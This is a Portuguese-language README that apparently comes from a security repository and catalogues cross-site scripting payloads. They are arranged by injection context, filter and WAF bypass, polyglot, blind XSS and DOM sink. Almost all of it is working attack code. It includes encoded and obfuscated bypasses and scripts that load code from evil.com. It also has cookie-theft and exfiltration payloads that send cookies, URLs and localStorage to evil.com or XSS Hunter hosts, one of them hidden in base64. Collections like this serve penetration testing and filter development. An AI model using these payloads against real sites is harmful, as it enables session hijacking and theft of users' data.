# 💉 Coleção de payloads de XSS

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](XSS.tr.md) • [🇬🇷 Ελληνικά](XSS.el.md)

```
  ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
   ██╔██╗ ╚════██║╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ██╔╝ ██╗███████║███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> **Notas de precisão:** XSS executa script no contexto de uma página; um sink é o ponto onde dados são interpretados de forma potencialmente perigosa. O resultado depende do contexto de inserção, do navegador e das proteções, como CSP ([MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)). Os exemplos de navegadores antigos, tags obsoletas e poliglotas não são universais; alguns contêm sequências malformadas, preservadas como no original. Um elemento script inserido por `innerHTML` não equivale necessariamente à execução desse script; outros elementos e eventos têm comportamentos distintos. `document.cookie` não expõe cookies com HttpOnly. Os exemplos Angular dependem da versão e do ambiente, e as URLs XSS Hunter são referências históricas/exemplificativas.

---

<a id="-table-of-contents"></a>
## 📋 Índice

- [Payloads básicos](#-basic-payloads)
- [Payloads de tratamento de eventos](#-event-handler-payloads)
- [Injeção em atributos](#-attribute-injection)
- [Contexto JavaScript](#-javascript-context)
- [Contorno de filtros](#-filter-bypass)
- [Contorno de WAF](#-waf-bypass)
- [Payloads poliglotas](#-polyglot-payloads)
- [XSS cego](#-blind-xss)
- [XSS no DOM](#-dom-xss)

---

<a id="-basic-payloads"></a>
## 🔴 Payloads básicos

### Tags script clássicas

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

### Tags com fecho automático

```html
<script src="https://evil.com/xss.js"/>
<script src=//evil.com/xss.js></script>
<script/src="https://evil.com/xss.js"></script>
```

### Script externo

```html
<script src="https://evil.com/xss.js"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>
```

---

<a id="-event-handler-payloads"></a>
## ⚡ Payloads de tratamento de eventos

### Eventos de imagens

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src="x" onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src="javascript:alert(1)">
<img onload=alert('XSS') src="valid.jpg">
```

### Eventos SVG

```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

### Eventos de body

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
```

### Eventos de input

```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="image" src=x onerror=alert('XSS')>
<input type="text" onfocus="alert('XSS')" autofocus>
```

### Outros tratamentos de eventos

```html
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<a onmouseover=alert('XSS')>click me</a>
<div onmouseover=alert('XSS')>hover me</div>
<form onsubmit=alert('XSS')><input type=submit>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

---

<a id="-attribute-injection"></a>
## 🔗 Injeção em atributos

### Sair do contexto de atributos

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onmouseover='alert(1)'
" onfocus="alert('XSS')" autofocus "
```

### Eventos em atributos

```html
" onclick=alert('XSS') "
" onmouseover=alert('XSS') "
" onfocus=alert('XSS') autofocus "
" onload=alert('XSS') "
```

### Atributo style (navegadores antigos)

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="width:expression(alert('XSS'))">
```

---

<a id="-javascript-context"></a>
## 📜 Contexto JavaScript

### Sair do contexto JavaScript

```javascript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"
\';alert(1)//
\";alert(1)//
```

### Template literals (literais de modelo)

```javascript
${alert('XSS')}
`${alert(1)}`
${alert`XSS`}
```

### Dentro de JSON

```json
{"name":"test","value":"</script><script>alert(1)</script>"}
```

---

<a id="-filter-bypass"></a>
## 🔓 Contorno de filtros

### Variação de maiúsculas/minúsculas

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</scRIPT>
<IMG SRC=x OnErRoR=alert('XSS')>
```

### Quebra de tags

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<sc\x00ript>alert('XSS')</sc\x00ript>
<scr\x09ipt>alert('XSS')</scr\x09ipt>
```

### Codificação — Entidades HTML

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

### Codificação URL

```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
```

### Codificação Unicode

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

### Injeção de byte nulo

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<img src=x onerror=alert('XSS')\x00>
```

### Contorno através de espaços em branco

```html
<img/src=x/onerror=alert('XSS')>
<img\nsrc=x\nonerror=alert('XSS')>
<img\tsrc=x\tonerror=alert('XSS')>
<img src=x	onerror=alert('XSS')>
```

### Sem parênteses

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

### Sem aspas

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/XSS/)>
```

---

<a id="-waf-bypass"></a>
## 🛡️ Contorno de WAF

### Dupla codificação

```html
%253Cscript%253Ealert(1)%253C/script%253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
```

### Utilizar comentários

```html
<script>/**/alert('XSS')/**/</script>
<img src=x onerror=/**/alert(1)/**//>
<!--<script>-->alert(1)<!--</script>-->
```

### Mudanças de linha

```html
<script>
alert('XSS')
</script>

<img src=x
onerror
=
alert(1)>
```

### Tags alternativas

```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<isindex action="javascript:alert(1)" type=submit value=click>
```

### Contorno baseado em SVG

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg/onload=alert(1)>
```

### Utilizar `eval`

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### Utilizar `setTimeout`/`setInterval`

```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<img src=x onerror=setTimeout('alert(1)')>
```

### Utilizar `fetch`

```html
<script>fetch('https://evil.com/'+document.cookie)</script>
```

---

<a id="-polyglot-payloads"></a>
## 🎭 Payloads poliglotas

### Payloads poliglotas de XSS para vários contextos

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telecomhallx27telecomhall;)>'">

"><img src=x onerror=alert(1)//>'\"><img src=x onerror=alert(1)//><img src=x onerror=alert(1)//>'\"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Payload poliglota curto

```html
'"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
```

---

<a id="-blind-xss"></a>
## 👁️ XSS cego

### Roubo de cookies

```html
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
<script>fetch('https://evil.com/'+document.cookie)</script>
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">
```

### Exfiltração de dados

```html
<script>
var i=new Image();
i.src="https://evil.com/?cookie="+document.cookie+"&url="+document.URL;
</script>

<script>
fetch('https://evil.com/collect',{
    method:'POST',
    body:JSON.stringify({
        cookie:document.cookie,
        url:location.href,
        localStorage:JSON.stringify(localStorage)
    })
})
</script>
```

### Payloads de XSS Hunter

```html
"><script src=https://xss.ht></script>
"><img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veHNzLmh0Lz9jPScrZG9jdW1lbnQuY29va2ll'))">
```

### XSS cego em formulários

```html
"><script src="https://your.xss.ht"></script>
test@test.com"><script src="https://your.xss.ht"></script>
{{constructor.constructor('fetch("https://your.xss.ht?c="+document.cookie)')()}}
```

---

<a id="-dom-xss"></a>
## 🌐 XSS no DOM

### XSS no DOM a partir de fontes de dados

```javascript
// Fragmento do URL
https://example.com#<script>alert(1)</script>

// Parâmetro do URL
https://example.com?name=<script>alert(1)</script>

// document.referrer
Referer: <script>alert(1)</script>
```

### Sinks comuns (pontos de utilização dos dados)

```javascript
// innerHTML
document.getElementById('x').innerHTML = userInput;
// Payload: <img src=x onerror=alert(1)>

// document.write
document.write(userInput);
// Payload: <script>alert(1)</script>

// eval
eval(userInput);
// Payload: alert(1)

// location
location = userInput;
location.href = userInput;
// Payload: javascript:alert(1)
```

### Sinks de jQuery

```javascript
// $().html()
$('#x').html(userInput);
// Payload: <img src=x onerror=alert(1)>

// $()
$(userInput);
// Payload: <img src=x onerror=alert(1)>

// $.parseHTML()
$.parseHTML(userInput);
// Payload: <img src=x onerror=alert(1)>
```

### Payloads de Angular

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

---

<a id="-quick-reference-by-context"></a>
## 📊 Referência rápida por contexto

### Contexto HTML
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Contexto de atributos
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

### Contexto de cadeia JavaScript
```javascript
';alert(1)//
"-alert(1)-"
</script><script>alert(1)</script>
```

### Contexto de URL
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

<a id="-resources"></a>
## 📚 Recursos

- [Guia de referência XSS da PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Contorno de filtros XSS da OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

<p align="center">
  <b>💉 Arsenal de payloads de XSS</b><br>
  <i>Apenas para fins educativos!</i>
</p>
